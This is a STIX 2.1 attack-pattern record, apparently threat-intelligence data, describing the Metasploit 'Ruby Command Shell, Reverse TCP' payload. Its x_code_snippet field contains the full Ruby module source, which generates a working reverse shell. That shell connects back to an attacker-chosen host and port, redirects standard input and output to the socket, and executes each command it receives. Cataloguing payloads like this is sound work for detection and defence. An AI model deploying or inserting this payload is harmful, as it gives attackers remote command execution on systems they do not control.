{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f8d074fa-6144-42bf-9291-99d8aeccafa4",
    "created": "2024-08-14T16:33:19.283761Z",
    "modified": "2024-08-14T16:33:19.283764Z",
    "name": "Ruby Command Shell, Reverse TCP",
    "description": "Connect back and create a command shell via Ruby",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/ruby/shell_reverse_tcp.rb",
            "external_id": "shell_reverse_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 516\n\n  include Msf::Payload::Single\n  include Msf::Payload::Ruby\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'        => 'Ruby Command Shell, Reverse TCP',\n      'Description' => 'Connect back and create a command shell via Ruby',\n      'Author'      => [ 'kris katterjohn', 'hdm' ],\n      'License'     => MSF_LICENSE,\n      'Platform'    => 'ruby',\n      'Arch'        => ARCH_RUBY,\n      'Handler'     => Msf::Handler::ReverseTcp,\n      'Session'     => Msf::Sessions::CommandShell,\n      'PayloadType' => 'ruby',\n      'Payload'     => { 'Offsets' => {}, 'Payload' => '' }\n    ))\n  end\n\n  def generate(_opts = {})\n    return prepends(ruby_string)\n  end\n\n  def ruby_string\n    lhost = datastore['LHOST']\n    lhost = \"[#{lhost}]\" if Rex::Socket.is_ipv6?(lhost)\n    \"require 'socket';c=TCPSocket.new(\\\"#{lhost}\\\", #{datastore['LPORT'].to_i});\" +\n    \"$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);$stdin.each_line{|l|l=l.strip;next if l.length==0;\" +\n    \"(IO.popen(l,\\\"rb\\\"){|fd| fd.each_line {|o| c.puts(o.strip) }}) rescue nil }\"\n  end\nend\n",
    "x_mitre_platforms": [
        "ruby'"
    ]
}